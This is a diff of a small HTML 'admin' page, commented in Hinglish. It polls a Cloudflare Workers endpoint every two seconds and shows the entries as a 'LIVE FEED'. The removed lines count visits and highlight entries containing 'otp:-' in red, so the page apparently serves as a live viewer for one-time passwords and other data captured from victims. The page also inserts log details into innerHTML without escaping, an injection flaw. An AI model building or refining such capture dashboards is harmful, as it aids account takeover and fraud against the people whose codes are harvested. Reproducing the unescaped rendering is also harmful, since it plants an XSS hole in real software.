@@ -1,74 +1,34 @@
 <!DOCTYPE html>
-<html lang="hi">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Strict Left Admin</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        /* Extreme Reset - Force Left */
-        * { 
-            margin: 0 !important; 
-            padding: 0 !important; 
-            box-sizing: border-box !important; 
-            text-align: left !important;
-            font-family: 'Arial', sans-serif;
-        }
-
-        body { 
-            background-color: #ffffff; 
-            padding: 10px !important; /* Sirf body mein thoda gap taaki chipak na jaye screen se */
-        }
-
-        .header {
-            width: 100%;
-            padding-bottom: 10px !important;
-            border-bottom: 2px solid #000;
-            margin-bottom: 15px !important;
-            display: flex !important;
-            justify-content: space-between !important;
-        }
-
-        /* Data List */
-        #logsDisplay {
-            width: 100%;
-            display: block !important;
-        }
-
-        /* Minimal Line Style */
-        .log-entry {
-            display: block !important;
-            width: 100%;
-            padding: 8px 0 !important; /* Upar niche gap */
-            border-bottom: 1px solid #ccc; /* Niche patli line */
-            color: #000000;
-            font-weight: 900; /* Extra Bold */
-            font-size: 16px;
-            line-height: 1.4;
-            white-space: pre-wrap;
+        * { margin: 0; padding: 0; box-sizing: border-box; text-align: left !important; }
+        body { background: #fff; padding: 5px; }
+        
+        .header { width: 100%; padding: 10px 0; border-bottom: 2px solid #000; margin-bottom: 5px; }
+        
+        table { width: 100%; border-collapse: collapse; }
+        .log-row { border-bottom: 1px solid #000; width: 100%; }
+        
+        .log-cell { 
+            padding: 8px 0; 
+            font-family: monospace; /* Ekdum barabar dikhne ke liye */
+            font-size: 16px; 
+            font-weight: 900; 
+            color: #000;
+            white-space: pre-wrap; 
             word-break: break-all;
+            display: block;
+            width: 100%;
         }
-
-        .time {
-            display: block !important;
-            font-size: 10px;
-            color: #777;
-            font-weight: 400;
-            margin-top: 4px !important;
-        }
-
-        /* OTP highlight - Sirf Text Red */
-        .is-otp { color: #ff0000 !important; }
+        .time { font-size: 10px; color: #666; font-weight: 400; display: block; }
     </style>
 </head>
 <body>
-
-    <div class="header">
-        <h1 style="font-size: 14px;">LIVE FEED</h1>
-        <span id="vCount" style="background:#000; color:#fff; padding:2px 8px; font-weight:900;">0</span>
-    </div>
-
-    <div id="logsDisplay">
-        </div>
+    <div class="header"><b>LIVE (LEFT ALIGNED)</b></div>
+    <table><tbody id="logsDisplay"></tbody></table>
 
     <script>
         const workerURL = 'https://flat-fog-a0cd.sumankkuuyy.workers.dev/';
@@ -81,26 +41,12 @@
                 if (JSON.stringify(data) === lastHash) return;
                 lastHash = JSON.stringify(data);
 
-                const display = document.getElementById('logsDisplay');
-                document.getElementById('vCount').innerText = data.length;
-
-                display.innerHTML = data.map(log => {
-                    if (log.detail === "COUNT" || (log.type && log.type.includes("VISIT"))) return "";
-
-                    // Front-end par bhi trim kar dete hain safety ke liye
-                    let cleanDetail = log.detail.trim();
-                    let otpClass = cleanDetail.toLowerCase().includes("otp:-") ? "is-otp" : "";
-
-                    return `
-                        <div class="log-entry ${otpClass}">
-                            ${cleanDetail}
-                            <span class="time">${log.time || ''}</span>
-                        </div>
-                    `;
+                document.getElementById('logsDisplay').innerHTML = data.map(log => {
+                    if (log.detail === "COUNT") return "";
+                    return `<tr class="log-row"><td class="log-cell">${log.detail}<span class="time">${log.time}</span></td></tr>`;
                 }).join('');
-            } catch (e) { console.log("Sync..."); }
+            } catch (e) {}
         }
-
         setInterval(fetchLogs, 2000);
         window.onload = fetchLogs;
     </script>
